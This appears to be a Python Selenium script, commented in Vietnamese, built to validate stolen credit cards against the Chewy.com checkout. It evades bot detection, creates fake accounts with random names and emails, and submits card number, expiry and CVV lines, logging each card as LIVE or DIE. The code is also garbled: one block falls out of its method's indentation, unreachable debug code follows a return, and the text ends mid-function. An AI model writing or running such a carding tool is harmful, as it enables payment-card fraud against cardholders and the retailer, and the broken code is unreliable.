#!/usr/bin/env python3
"""
Credit Card Checker - CHEWY.COM
"""

import time
import json
import requests
from typing import Dict, Tuple, Optional
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select

try:
    from seleniumbase import Driver
except ImportError:
    print("[!] Cần cài đặt: pip install seleniumbase")
    exit(1)


class CardCheckerChewy:
    def __init__(self):
        self.driver = None
        self.base_url = "https://www.chewy.com"
        self.email = None
        self.password = "Password123@"  # Set default password
        self.initialized = False  # Track xem đã chạy initialization chưa
        self.live_count = 0  # Đếm số thẻ LIVE trong account hiện tại
        
        print("\n" + "="*70)
        print("CARD CHECKER - CHEWY.COM")
        print("="*70)
        
        self._init_browser()
    
    def _init_browser(self):
        try:
            print("[*] Đang khởi động browser...")
            self.driver = Driver(
                uc=True,
                incognito=False,
                agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
                # Thêm options để bypass detection
                disable_csp=True,
                ad_block_on=False
            )
            
            # Set thêm properties để giống browser thật
            self.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
                "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
                "platform": "MacIntel",
                "userAgentMetadata": {
                    "brands": [
                        {"brand": "Chromium", "version": "142"},
                        {"brand": "Google Chrome", "version": "142"},
                        {"brand": "Not_A Brand", "version": "99"}
                    ],
                    "fullVersion": "142.0.0.0",
                    "platform": "macOS",
                    "platformVersion": "10.15.7",
                    "architecture": "arm",
                    "model": "",
                    "mobile": False
                }
            })
            
            print("[✓] Browser đã sẵn sàng")
        except Exception as e:
            print(f"[!] Lỗi: {e}")
            raise
    
    def get_random_name(self) -> str:
        """Generate random American name"""
        import random
        
        first_names = [
            "James", "Michael", "Robert", "David", "William", "Richard", "Joseph", 
            "Thomas", "Christopher", "Daniel", "Matthew", "Donald", "Mark", "Paul",
            "Steven", "Andrew", "Kenneth", "Joshua", "Kevin", "Brian", "George",
            "Timothy", "Ronald", "Edward", "Jason", "Jeffrey", "Ryan", "Jacob",
            "Gary", "Nicholas", "Eric", "Jonathan", "Stephen", "Larry", "Justin",
            "Scott", "Brandon", "Benjamin", "Samuel", "Raymond", "Gregory", "Frank"
        ]
        
        last_names = [
            "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Martinez",
            "Anderson", "Taylor", "Moore", "Jackson", "White", "Harris", "Martin",
            "Thompson", "Clark", "Rodriguez", "Lewis", "Lee", "Walker", "Hall",
            "Allen", "Young", "King", "Wright", "Lopez", "Hill", "Scott", "Green",
            "Adams", "Baker", "Nelson", "Carter", "Mitchell", "Perez", "Roberts",
            "Turner", "Phillips", "Campbell", "Parker", "Evans", "Edwards", "Collins"
        ]
        
        full_name = f"{random.choice(first_names)} {random.choice(last_names)}"
        return full_name
    
    def get_temp_email(self) -> Optional[str]:
        """Generate random email thay vì call API"""
        try:
            import random
            import string
            
            # Generate random email
            random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
            domain = random.choice(domains)
            
            email = f"{random_str}@{domain}"
            
            print(f"[✓] Generated email: {email}")
            self.email = email
            return email
            
        except Exception as e:
            print(f"[!] Lỗi: {e}")
            return None
    
    def wait_for_element(self, selector: str, by: str = "css", timeout: int = 10, clickable: bool = False):
        try:
            by_type = By.CSS_SELECTOR if by == "css" else By.XPATH
            wait = WebDriverWait(self.driver, timeout)
            
            if clickable:
                return wait.until(EC.element_to_be_clickable((by_type, selector)))
            else:
                return wait.until(EC.presence_of_element_located((by_type, selector)))
        except:
            return None
    
    def safe_click(self, element, desc: str = "", use_js_only: bool = False):
        try:
            print(f"[*] Attempting to click {desc}...")
            
            # Scroll element into view
            print(f"[*] Scrolling {desc} into view...")
            try:
                self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
                time.sleep(0.3)
            except Exception as scroll_e:
                print(f"[!] Scroll warning: {scroll_e}")
            
            # Use async JavaScript click with timeout to prevent hang
            print(f"[*] Using async JavaScript click on {desc}...")
            try:
                # Set async script timeout
                self.driver.set_script_timeout(3)
                
                # Use async script that doesn't wait for navigation
                script = """
                var callback = arguments[arguments.length - 1];
                var element = arguments[0];
                
                try {
                    element.click();
                    // Return immediately, don't wait for navigation
                    setTimeout(function() {
                        callback('SUCCESS');
                    }, 100);
                } catch (e) {
                    callback('ERROR: ' + e.message);
                }
                """
                
                result = self.driver.execute_async_script(script, element)
                print(f"[✓] Async click result: {result}")
                
                # Short delay for any immediate effects
                time.sleep(0.5)
                
            except Exception as js_e:
                print(f"[!] Async click failed on {desc}: {js_e}")
                # Fallback to direct click with timeout
                try:
                    print(f"[*] Fallback: Direct click on {desc}...")
                    self.driver.set_script_timeout(2)
                    self.driver.execute_script("arguments[0].click();", element)
                    print(f"[✓] Direct click executed")
                    time.sleep(0.3)
                except:
                    return False
            
            print(f"[✓] Clicked {desc}")
            return True
        except Exception as e:
            print(f"[!] Lỗi click {desc}: {e}")
            return False
    
    def parse_card(self, card_line: str) -> Optional[Dict]:
        """Parse card từ format: number|month|year|cvv"""
        try:
            parts = card_line.strip().split('|')
            if len(parts) < 4:
                return None
            
            return {
                'number': parts[0].strip(),
                'exp_month': parts[1].strip().zfill(2),
                'exp_year': parts[2].strip(),
                'cvv': parts[3].strip()
            }
        except:
            return None
    
    def check_card(self, card_line: str) -> Tuple[str, str, str]:
        """
        Check một thẻ
        Returns: (card_info, status, message)
        """
        try:
            card = self.parse_card(card_line)
            if not card:
                return (card_line, "INVALID", "Sai format")
            
            # Nếu chưa initialize, chạy full flow
            if not self.initialized:
                # Step 1: Register account
                if not self.register_account():
                    return (card_line, "ERROR", "Không thể đăng ký tài khoản")
                
                # Step 2: Click vào sản phẩm/category
                if not self.click_product():
                    return (card_line, "ERROR", "Không thể click vào sản phẩm")
                
                # Step 3: Add product
                if not self.add_product_to_cart():
                    return (card_line, "ERROR", "Không thể add sản phẩm")
                
                # Step 3: Go to cart
                if not self.go_to_cart():
                    return (card_line, "ERROR", "Không vào được giỏ hàng")
                
                # Step 4: Checkout
                if not self.process_checkout():
                    return (card_line, "ERROR", "Không checkout được")
                
                # Step 5: Fill shipping address
                if not self.fill_shipping_address():
                    return (card_line, "ERROR", "Không điền được shipping address")
                
                self.initialized = True
                print("[✓] Initialization completed!\n")
            
            # Step 6: Fill payment and submit
            status, message = self.fill_payment_info(card)
            
            # Nếu thẻ LIVE → Tăng counter
            if status == "APPROVED":
                self.live_count += 1
                print(f"[✓] Thẻ LIVE! (Tổng: {self.live_count} thẻ LIVE trong account này)")
            # Nếu thẻ DIE → Giữ nguyên account, xóa form để check thẻ tiếp
            else:
                print("[!] Thẻ DIE! Giữ nguyên account, check thẻ tiếp theo...")
            
            return (card_line, status, message)
            
        except Exception as e:
            return (card_line, "ERROR", str(e))
    
    def register_account(self) -> bool:
        """B1-B8: Đăng ký tài khoản"""
        try:
            if not self.email:
                if not self.get_temp_email():
                    return False
            
            print(f"[*] B1: Mở {self.base_url}...")
            self.driver.get(self.base_url)
            print("[*] Đợi trang load...")
            
            # Đợi và check xem trang có render không
            time.sleep(5)
            
            # Check nếu bị Cloudflare challenge
            page_source = self.driver.page_source.lower()
            if "just a moment" in page_source or "checking your browser" in page_source:
                print("[*] Phát hiện Cloudflare challenge, đợi thêm...")
                time.sleep(10)
            
            # Scroll nhẹ để giống người dùng thật
            self.driver.execute_script("window.scrollTo(0, 100);")
            time.sleep(1)
            self.driver.execute_script("window.scrollTo(0, 0);")
            time.sleep(1)
            
            print("[*] B2: Click Sign In...")
            print("[*] Đợi button Sign In xuất hiện...")
            sign_in = self.wait_for_element("#header > header > div.desktop-header > div > div > div:nth-child(6) > span > span > span > a > div", clickable=True, timeout=15)
            if not sign_in:
                print("[!] Không tìm thấy button Sign In sau 15s")
                return False
            time.sleep(1)  # Đợi thêm trước khi click
            self.safe_click(sign_in, "Sign In")
            time.sleep(3)
            
            print("[*] B3: Nhập email...")
            print("[*] Đợi input email xuất hiện...")
            email_input = self.wait_for_element("#username", timeout=15)
            if not email_input:
                print("[!] Không tìm thấy input email")
                return False
            time.sleep(1)
            email_input.clear()
            email_input.send_keys(self.email)
            print(f"[✓] Đã nhập email: {self.email}")
            time.sleep(1)
            
            print("[*] B4: Click Continue...")
            continue_btn = self.wait_for_element("#kc-login", clickable=True, timeout=10)
            if not continue_btn:
                print("[!] Không tìm thấy button Continue")
                return False
            time.sleep(1)
            self.safe_click(continue_btn, "Continue")
            time.sleep(3)
            
            print("[*] B5: Nhập name...")
            print("[*] Đợi input name xuất hiện...")
            name_input = self.wait_for_element("#fullName", timeout=15)
            if not name_input:
                print("[!] Không tìm thấy input name")
                return False
            time.sleep(1)
            
            # Generate random name
            random_name = self.get_random_name()
            print(f"[*] Generated name: {random_name}")
            
            name_input.clear()
            name_input.send_keys(random_name)
            print(f"[✓] Đã nhập name: {random_name}")
            time.sleep(1)
            
            # DEBUG: Check tình trạng ngay sau khi nhập name
            print("\n" + "="*50)
            print("DEBUG INFO - AFTER ENTER NAME")
            print("="*50)
            
            try:
                current_url = self.driver.current_url
                print(f"[DEBUG] Current URL: {current_url}")
                
                page_title = self.driver.title
                print(f"[DEBUG] Page Title: {page_title}")
                
                # Check CAPTCHA
                captcha_elements = self.driver.find_elements("xpath", "//*[contains(@class, 'captcha') or contains(@class, 'recaptcha') or contains(text(), 'captcha') or contains(text(), 'robot')]")
                if captcha_elements:
                    print(f"[DEBUG] ⚠️  FOUND {len(captcha_elements)} CAPTCHA ELEMENTS!")
                    for i, cap in enumerate(captcha_elements[:2]):
                        if cap.is_displayed():
                            print(f"  CAPTCHA {i}: {cap.text[:100]}")
                else:
                    print("[DEBUG] ✅ No CAPTCHA found")
                
                # Check error/block messages
                block_keywords = ['blocked', 'suspicious', 'verify', 'security', 'unusual activity']
                for keyword in block_keywords:
                    elements = self.driver.find_elements("xpath", f"//*[contains(text(), '{keyword}')]")
                    if elements:
                        print(f"[DEBUG] ⚠️  FOUND '{keyword}' messages:")
                        for elem in elements[:2]:
                            if elem.is_displayed():
                                print(f"  {keyword}: {elem.text[:100]}")
                
                # Check loading states
                loading_elements = self.driver.find_elements("xpath", "//*[contains(@class, 'loading') or contains(@class, 'spinner') or contains(text(), 'Loading') or contains(text(), 'Please wait')]")
                if loading_elements:
                    print(f"[DEBUG] 🔄 Found {len(loading_elements)} loading indicators")
                else:
                    print("[DEBUG] ✅ No loading indicators")
                
                # Check page responsiveness
                try:
                    self.driver.execute_script("return document.readyState")
                    print("[DEBUG] ✅ JavaScript execution working")
                except Exception as js_e:
                    print(f"[DEBUG] ❌ JavaScript execution failed: {js_e}")
                
                # Check network status
                try:
                    network_state = self.driver.execute_script("return navigator.onLine")
                    print(f"[DEBUG] Network online: {network_state}")
                except:
                    print("[DEBUG] Cannot check network status")
                
            except Exception as e:
                print(f"[DEBUG] Error getting page info: {e}")
            
            print("="*50)
            print("END DEBUG INFO")
            print("="*50 + "\n")
            
            print("[*] B6: Click Next...")
            
            # DEBUG: In ra thông tin chi tiết về trang hiện tại
            print("\n" + "="*50)
            print("DEBUG INFO - BEFORE CLICK NEXT")
            print("="*50)
            
            try:
                current_url = self.driver.current_url
                print(f"[DEBUG] Current URL: {current_url}")
                
                page_title = self.driver.title
                print(f"[DEBUG] Page Title: {page_title}")
                
                # Check nếu có loading indicator
                loading_elements = self.driver.find_elements("xpath", "//*[contains(@class, 'loading') or contains(@class, 'spinner') or contains(text(), 'Loading')]")
                if loading_elements:
                    print(f"[DEBUG] Found {len(loading_elements)} loading indicators")
                else:
                    print("[DEBUG] No loading indicators found")
                
                # Check page source một phần
                page_source = self.driver.page_source
                print(f"[DEBUG] Page source length: {len(page_source)} characters")
                
                # Tìm tất cả forms
                forms = self.driver.find_elements("xpath", "//form")
                print(f"[DEBUG] Found {len(forms)} forms on page")
                
                # Tìm tất cả inputs
                inputs = self.driver.find_elements("xpath", "//input")
                print(f"[DEBUG] Found {len(inputs)} input elements")
                for i, inp in enumerate(inputs[:5]):  # Chỉ show 5 đầu
                    print(f"  Input {i}: type='{inp.get_attribute('type')}', id='{inp.get_attribute('id')}', name='{inp.get_attribute('name')}'")
                
                # Tìm tất cả buttons
                all_buttons = self.driver.find_elements("xpath", "//button | //input[@type='submit'] | //input[@type='button']")
                print(f"[DEBUG] Found {len(all_buttons)} button elements")
                for i, btn in enumerate(all_buttons):
                    if btn.is_displayed():
                        btn_text = btn.text.strip() or btn.get_attribute('value') or 'NO_TEXT'
                        print(f"  Button {i}: text='{btn_text}', id='{btn.get_attribute('id')}', enabled={btn.is_enabled()}")
                
            except Exception as e:
                print(f"[DEBUG] Error getting page info: {e}")
            
            print("="*50)
            print("END DEBUG INFO")
            print("="*50 + "\n")
            
            # Thử nhiều cách tìm button Next với retry
            next_btn = None
            max_retries = 3
            
            for attempt in range(max_retries):
                print(f"[*] Tìm button Next (attempt {attempt + 1}/{max_retries})...")
                
                # Cách 1: Selector gốc
                try:
                    next_btn = self.wait_for_element("#kc-login", clickable=True, timeout=5)
                    if next_btn and next_btn.is_enabled():
                        print("[✓] Tìm thấy button bằng #kc-login")
                        break
                except Exception as e:
                    print(f"[DEBUG] Cách 1 failed: {e}")
                    pass
                
                # Cách 2: Tìm bằng text "Next"
                if not next_btn:
                    try:
                        buttons = self.driver.find_elements("xpath", "//button[contains(text(), 'Next')] | //input[@value='Next']")
                        for btn in buttons:
                            if btn.is_displayed() and btn.is_enabled():
                                next_btn = btn
                                print("[✓] Tìm thấy button bằng text 'Next'")
                                break
                    except:
                        pass
                
                # Cách 3: Tìm button submit trong form
                if not next_btn:
                    try:
                        buttons = self.driver.find_elements("xpath", "//button[@type='submit'] | //input[@type='submit']")
                        for btn in buttons:
                            if btn.is_displayed() and btn.is_enabled():
                                next_btn = btn
                                print("[✓] Tìm thấy submit button")
                                break
                    except:
                        pass
                
                if next_btn:
                    break
                
                print(f"[!] Không tìm thấy button Next (attempt {attempt + 1})")
                if attempt < max_retries - 1:
                    print("[*] Đợi và retry...")
                    time.sleep(3)
            
            if not next_btn:
                print("[!] Không tìm thấy button Next sau 3 lần thử")
                # Debug: In ra tất cả buttons trên trang
                print("[DEBUG] Tất cả buttons trên trang:")
                try:
                    all_buttons = self.driver.find_elements("xpath", "//button | //input[@type='submit'] | //input[@type='button']")
                    for i, btn in enumerate(all_buttons):
                        if btn.is_displayed():
                            print(f"Button {i}: text='{btn.text}', value='{btn.get_attribute('value')}', id='{btn.get_attribute('id')}'")
                except:
                    pass
                return False
            
            time.sleep(1)
            print(f"[*] Clicking Next button: {next_btn.tag_name}")
            
            # DEBUG: Print ALL possible selectors for this button
            try:
                print("\n" + "="*50)
                print("BUTTON SELECTORS DEBUG")
                print("="*50)
                print(f"[DEBUG] Element tag: {next_btn.tag_name}")
                print(f"[DEBUG] Element text: '{next_btn.text}'")
                print(f"[DEBUG] Element id: '{next_btn.get_attribute('id')}'")
                print(f"[DEBUG] Element class: '{next_btn.get_attribute('class')}'")
                print(f"[DEBUG] Element name: '{next_btn.get_attribute('name')}'")
                print(f"[DEBUG] Element type: '{next_btn.get_attribute('type')}'")
                print(f"[DEBUG] Element displayed: {next_btn.is_displayed()}")
                print(f"[DEBUG] Element enabled: {next_btn.is_enabled()}")
                print(f"[DEBUG] Element location: {next_btn.location}")
                print(f"[DEBUG] Element size: {next_btn.size}")
                
                # Get full HTML
                outer_html = next_btn.get_attribute('outerHTML')
                print(f"[DEBUG] Element HTML: {outer_html[:300]}")
                
                # Get all possible CSS selectors
                print("\n[DEBUG] Possible CSS Selectors:")
                print(f"  - By ID: #{next_btn.get_attribute('id')}")
                if next_btn.get_attribute('class'):
                    classes = next_btn.get_attribute('class').split()
                    print(f"  - By Class: .{'.'.join(classes)}")
                if next_btn.get_attribute('name'):
                    print(f"  - By Name: [name='{next_btn.get_attribute('name')}']")
                print(f"  - By Type: button[type='{next_btn.get_attribute('type')}']")
                
                # Try to get XPath
                try:
                    xpath = self.driver.execute_script("""
                        function getXPath(element) {
                            if (element.id !== '')
                                return '//*[@id="' + element.id + '"]';
                            if (element === document.body)
                                return '/html/body';
                            var ix = 0;
                            var siblings = element.parentNode.childNodes;
                            for (var i = 0; i < siblings.length; i++) {
                                var sibling = siblings[i];
                                if (sibling === element)
                                    return getXPath(element.parentNode) + '/' + element.tagName.toLowerCase() + '[' + (ix + 1) + ']';
                                if (sibling.nodeType === 1 && sibling.tagName === element.tagName)
                                    ix++;
                            }
                        }
                        return getXPath(arguments[0]);
                    """, next_btn)
                    print(f"  - XPath: {xpath}")
                except:
                    pass
                
                print("="*50 + "\n")
                
            except Exception as debug_e:
                print(f"[DEBUG] Error checking element: {debug_e}")
            
            print("[DEBUG] Trying direct methods to click Next...")
            
            # Try multiple direct methods (no setTimeout wrapper)
            click_success = False
            
            # Method 1: Form submit (most reliable for form buttons)
            print("[*] Method 1: Form submit...")
            try:
                form = self.driver.find_element("xpath", "//form")
                if form:
                    form.submit()
                    print("[✓] Form submitted")
                    click_success = True
            except Exception as e:
                print(f"[!] Form submit failed: {e}")
            
            # Method 2: Direct JS click (if form submit failed)
            if not click_success:
                print("[*] Method 2: Direct JavaScript click...")
                try:
                    # Use direct click without setTimeout
                    self.driver.execute_script("arguments[0].click();", next_btn)
                    print("[✓] Direct JS click executed")
                    click_success = True
                except Exception as e:
                    print(f"[!] Direct JS click failed: {e}")
            
            # Method 3: Selenium click (last resort)
            if not click_success:
                print("[*] Method 3: Selenium click...")
                try:
                    next_btn.click()
                    print("[✓] Selenium click executed")
                    click_success = True
                except Exception as e:
                    print(f"[!] Selenium click failed: {e}")
            
            if not click_success:
                print("[!] All click methods failed")
                return False
            
            print(f"[DEBUG] Click attempted, waiting for navigation...")
            
            # MUST verify page actually navigated before proceeding
            print("[*] Verifying page actually navigated...")
            max_wait = 8
            page_navigated = False
            
            for i in range(max_wait):
                time.sleep(1)
                
                # Check if radio button exists (means page navigated)
                try:
                    radio_exists = self.driver.execute_script("return document.querySelector('#channel-password') !== null;")
                    if radio_exists:
                        print(f"[✓] Page navigated successfully after {i+1}s")
                        page_navigated = True
                        break
                    else:
                        print(f"[*] Still waiting for navigation... ({i+1}/{max_wait}s)")
                except:
                    print(f"[*] Check failed, waiting... ({i+1}/{max_wait}s)")
            
            if not page_navigated:
                print("[!] Page did not navigate after clicking Next")
                return False
            
            # Đợi lâu hơn cho response
            print("[*] Đợi response sau khi click Next...")
            time.sleep(3)
            
            # DEBUG: Check response sau khi click
            print("\n" + "="*50)
            print("DEBUG INFO - AFTER CLICK NEXT")
            print("="*50)
            
            try:
                current_url = self.driver.current_url
                print(f"[DEBUG] New URL: {current_url}")
                
                page_title = self.driver.title
                print(f"[DEBUG] New Page Title: {page_title}")
                
                # Check nếu có error messages
                error_elements = self.driver.find_elements("xpath", "//*[contains(@class, 'error') or contains(@class, 'Error') or contains(text(), 'error') or contains(text(), 'Error')]")
                if error_elements:
                    print(f"[DEBUG] Found {len(error_elements)} error elements:")
                    for i, err in enumerate(error_elements[:3]):
                        if err.is_displayed():
                            print(f"  Error {i}: {err.text}")
                else:
                    print("[DEBUG] No error elements found")
                
                # Check nếu có loading
                loading_elements = self.driver.find_elements("xpath", "//*[contains(@class, 'loading') or contains(@class, 'spinner') or contains(text(), 'Loading')]")
                if loading_elements:
                    print(f"[DEBUG] Found {len(loading_elements)} loading indicators - page still loading")
                else:
                    print("[DEBUG] No loading indicators - page loaded")
                
                # Check page source length để xem có thay đổi không
                new_page_source = self.driver.page_source
                print(f"[DEBUG] New page source length: {len(new_page_source)} characters")
                
            except Exception as e:
                print(f"[DEBUG] Error getting post-click info: {e}")
            
            print("="*50)
            print("END DEBUG INFO")
            print("="*50 + "\n")
            
            # Đợi thêm nếu cần
            time.sleep(2)
            
            print("[*] B7: Chọn password...")
            
            # Try multiple methods to click radio button with verification
            radio_clicked = False
            max_attempts = 5
            
            for attempt in range(max_attempts):
                print(f"\n[*] Attempt {attempt + 1}/{max_attempts} to click radio button...")
                
                try:
                    if attempt == 0:
                        # Method 1: Direct JS - set checked and trigger events
                        print("[*] Method 1: Direct JavaScript (checked + click + events)...")
                        script = """
                        const radio = document.querySelector('#channel-password');
                        if (radio) {
                            radio.checked = true;
                            radio.click();
                            radio.dispatchEvent(new Event('change', { bubbles: true }));
                            radio.dispatchEvent(new Event('input', { bubbles: true }));
                            return radio.checked;
                        }
                        return false;
                        """
                        result = self.driver.execute_script(script)
                        print(f"[DEBUG] Result: {result}")
                        
                    elif attempt == 1:
                        # Method 2: Find element and use Selenium click
                        print("[*] Method 2: Selenium click...")
                        radio = self.driver.find_element("css selector", "#channel-password")
                        radio.click()
                        time.sleep(0.3)
                        result = radio.is_selected()
                        print(f"[DEBUG] Result: {result}")
                        
                    elif attempt == 2:
                        # Method 3: Click on label
                        print("[*] Method 3: Click on label...")
                        script = """
                        const label = document.querySelector('label[for="channel-password"]');
                        if (label) {
                            label.click();
                            const radio = document.querySelector('#channel-password');
                            return radio ? radio.checked : false;
                        }
                        return false;
                        """
                        result = self.driver.execute_script(script)
                        print(f"[DEBUG] Result: {result}")
                        
                    elif attempt == 3:
                        # Method 4: Find by index (2nd radio)
                        print("[*] Method 4: Click 2nd radio button...")
                        script = """
                        const radios = document.querySelectorAll('input[type="radio"]');
                        if (radios.length >= 2) {
                            radios[1].checked = true;
                            radios[1].click();
                            radios[1].dispatchEvent(new Event('change', { bubbles: true }));
                            return radios[1].checked;
                        }
                        return false;
                        """
                        result = self.driver.execute_script(script)
                        print(f"[DEBUG] Result: {result}")
                        
                    else:
                        # Method 5: Force checked via JavaScript
                        print("[*] Method 5: Force checked...")
                        script = """
                        const radio = document.querySelector('#channel-password');
                        if (radio) {
                            Object.defineProperty(radio, 'checked', {
                                get: function() { return true; },
                                set: function(value) {}
                            });
                            radio.checked = true;
                            radio.dispatchEvent(new Event('change', { bubbles: true }));
                            return true;
                        }
                        return false;
                        """
                        result = self.driver.execute_script(script)
                        print(f"[DEBUG] Result: {result}")
                    
                    # Verify if radio is checked
                    time.sleep(0.5)
                    is_checked = self.driver.execute_script("""
                        const radio = document.querySelector('#channel-password');
                        return radio ? radio.checked : false;
                    """)
                    
                    print(f"[DEBUG] Verification - Radio checked: {is_checked}")
                    
                    if is_checked:
                        print(f"[✓] SUCCESS! Radio clicked and verified on attempt {attempt + 1}")
                        radio_clicked = True
                        break
                    else:
                        print(f"[!] Attempt {attempt + 1} failed - radio not checked")
                        
                except Exception as e:
                    print(f"[!] Attempt {attempt + 1} error: {e}")
                
                # Wait before retry
                if attempt < max_attempts - 1:
                    time.sleep(0.5)
            
            if not radio_clicked:
                print("[!] All attempts failed to click radio button")
                return False
            
            print("[✓] Đã chọn Create a password")
            
            # Skip all the debug code below - go straight to password input
            print("[*] B8: Nhập password...")
            print("[*] Đợi input password xuất hiện...")
            password_input = self.wait_for_element("#password", timeout=10)
            if not password_input:
                print("[!] Không tìm thấy input password")
                return False
            time.sleep(1)
            password_input.clear()
            password_input.send_keys(self.password)
            print("[✓] Đã nhập password")
            time.sleep(1)
            
            print("[*] B8: Click Create Account...")
            create_btn = None

# Try multiple selectors for Create Account button
selectors = [
    "button[type='submit']",  # Submit button
    "//button[contains(text(), 'Create Account')]",  # XPath with text
    "//input[@value='Create Account']",  # Input XPath
    "button",  # Any button (will check text)
]

for selector in selectors:
    try:
        if selector.startswith("//"):
            elements = self.driver.find_elements("xpath", selector)
        else:
            elements = self.driver.find_elements("css selector", selector)
        
        for elem in elements:
            if elem.is_displayed() and elem.is_enabled():
                text = elem.text.lower() if elem.text else ""
                value = elem.get_attribute('value') or ""
                if "create" in text or "create" in value.lower():
                    create_btn = elem
                    print(f"[✓] Found Create Account button with text: '{elem.text}'")
                    break
        
        if create_btn:
            break
            
    except Exception as e:
        continue

if create_btn is None:
    create_btn = self.wait_for_element("button[type='submit']", clickable=True, timeout=10)
            if not create_btn:
                print("[!] Không tìm thấy button Create Account")
                return False
            
            time.sleep(1)
            
            # Click với nhiều cách khác nhau
            try:
                print("[*] Trying to click Create Account button...")
                self.safe_click(create_btn, "Create Account")
                print("[✓] Clicked Create Account button")
            except Exception as e:
                print(f"[!] Lỗi click button: {e}")
                # Thử click bằng JavaScript
                try:
                    print("[*] Trying JavaScript click...")
                    self.driver.execute_script("arguments[0].click();", create_btn)
                    print("[✓] JavaScript click successful")
                except Exception as e2:
                    print(f"[!] JavaScript click failed: {e2}")
                    return False
            
            print("[*] Đợi response sau khi click...")
            time.sleep(3)
            
            # Skip to return True - remove all debug code below
            return True
            
            # DEBUG: Print tất cả radio buttons trên trang (UNREACHABLE CODE - will be removed)
            print("\n" + "="*50)
            print("RADIO BUTTONS DEBUG")
            print("="*50)
            try:
                all_radios = self.driver.find_elements("xpath", "//input[@type='radio']")
                print(f"[DEBUG] Found {len(all_radios)} radio buttons on page:")
                for i, radio in enumerate(all_radios):
                    try:
                        print(f"\n  Radio {i}:")
                        print(f"    - ID: '{radio.get_attribute('id')}'")
                        print(f"    - Name: '{radio.get_attribute('name')}'")
                        print(f"    - Value: '{radio.get_attribute('value')}'")
                        print(f"    - Checked: {radio.is_selected()}")
                        print(f"    - Displayed: {radio.is_displayed()}")
                        print(f"    - Enabled: {radio.is_enabled()}")
                        
                        # Get label text
                        try:
                            parent = radio.find_element("xpath", "./..")
                            label_text = parent.text[:100] if parent.text else "NO_TEXT"
                            print(f"    - Label text: '{label_text}'")
                        except:
                            pass
                        
                        # Get HTML
                        outer_html = radio.get_attribute('outerHTML')
                        print(f"    - HTML: {outer_html[:200]}")
                    except Exception as e:
                        print(f"    - Error: {e}")
            except Exception as e:
                print(f"[DEBUG] Error listing radios: {e}")
            print("="*50 + "\n")
            
            # Dùng selector chính xác: #channel-password
            print("[*] Tìm radio button #channel-password...")
            password_radio = self.wait_for_element("#channel-password", clickable=True, timeout=10)
            
            if not password_radio:
                print("[!] Không tìm thấy radio button #channel-password")
                print("[*] Trying to find by other methods...")
                
                # Try to find "Create a password" radio by index (should be 2nd radio)
                try:
                    all_radios = self.driver.find_elements("xpath", "//input[@type='radio']")
                    if len(all_radios) >= 2:
                        password_radio = all_radios[1]
                        print(f"[✓] Found radio by index: {password_radio.get_attribute('id')}")
                except:
                    pass
                
                if not password_radio:
                    return False
            else:
                print("[✓] Tìm thấy radio button Create a password")
            
            # DEBUG: Print selector info for this radio
            print("\n" + "="*50)
            print("SELECTED RADIO BUTTON DEBUG")
            print("="*50)
            try:
                print(f"[DEBUG] Radio ID: '{password_radio.get_attribute('id')}'")
                print(f"[DEBUG] Radio Name: '{password_radio.get_attribute('name')}'")
                print(f"[DEBUG] Radio Value: '{password_radio.get_attribute('value')}'")
                print(f"[DEBUG] Radio Class: '{password_radio.get_attribute('class')}'")
                print(f"[DEBUG] Radio Checked: {password_radio.is_selected()}")
                print(f"[DEBUG] Radio Displayed: {password_radio.is_displayed()}")
                print(f"[DEBUG] Radio Enabled: {password_radio.is_enabled()}")
                print(f"[DEBUG] Radio Location: {password_radio.location}")
                
                # Possible selectors
                print("\n[DEBUG] Possible Selectors:")
                print(f"  - By ID: #{password_radio.get_attribute('id')}")
                print(f"  - By Name: [name='{password_radio.get_attribute('name')}']")
                print(f"  - By Value: [value='{password_radio.get_attribute('value')}']")
            except Exception as e:
                print(f"[DEBUG] Error: {e}")
            print("="*50 + "\n")
            
            time.sleep(1)
            
            # Try multiple click methods for radio button
            print("[*] Trying multiple click methods for radio button...")
            radio_click_success = False
            
            # Method 1: Direct JS click
            print("\n[*] Radio Method 1: Direct JavaScript click...")
            try:
                self.driver.execute_script("arguments[0].click();", password_radio)
                print("[✓] Method 1 executed")
                time.sleep(1)
                
                # Check if radio is now checked
                is_checked = password_radio.is_selected()
                print(f"[DEBUG] Radio checked after Method 1: {is_checked}")
                
                if is_checked:
                    print("[✓] Method 1 SUCCESS - radio checked!")
                    radio_click_success = True
            except Exception as e:
                print(f"[!] Method 1 failed: {e}")
            
            # Method 2: Selenium click
            if not radio_click_success:
                print("\n[*] Radio Method 2: Selenium click...")
                try:
                    password_radio.click()
                    print("[✓] Method 2 executed")
                    time.sleep(1)
                    
                    is_checked = password_radio.is_selected()
                    print(f"[DEBUG] Radio checked after Method 2: {is_checked}")
                    
                    if is_checked:
                        print("[✓] Method 2 SUCCESS - radio checked!")
                        radio_click_success = True
                except Exception as e:
                    print(f"[!] Method 2 failed: {e}")
            
            # Method 3: Click on label
            if not radio_click_success:
                print("\n[*] Radio Method 3: Click on label...")
                try:
                    label = self.driver.find_element("xpath", f"//label[@for='{password_radio.get_attribute('id')}']")
                    if label:
                        label.click()
                        print("[✓] Method 3 executed - clicked label")
                        time.sleep(1)
                        
                        is_checked = password_radio.is_selected()
                        print(f"[DEBUG] Radio checked after Method 3: {is_checked}")
                        
                        if is_checked:
                            print("[✓] Method 3 SUCCESS - radio checked!")
                            radio_click_success = True
                except Exception as e:
                    print(f"[!] Method 3 failed: {e}")
            
            if not radio_click_success:
                print("[!] All radio click methods failed")
                return False
            
            print("[✓] Đã chọn Create a password")
            time.sleep(1)
            
            print("[*] B8: Nhập password...")
            print("[*] Đợi input password xuất hiện...")
            password_input = self.wait_for_element("#password", timeout=10)
            if not password_input:
                print("[!] Không tìm thấy input password")
                return False
            time.sleep(1)
            password_input.clear()
            password_input.send_keys(self.password)
            print("[✓] Đã nhập password")
            time.sleep(1)
            
            print("[*] B8: Click Create Account...")
            create_btn = None

# Try multiple selectors for Create Account button
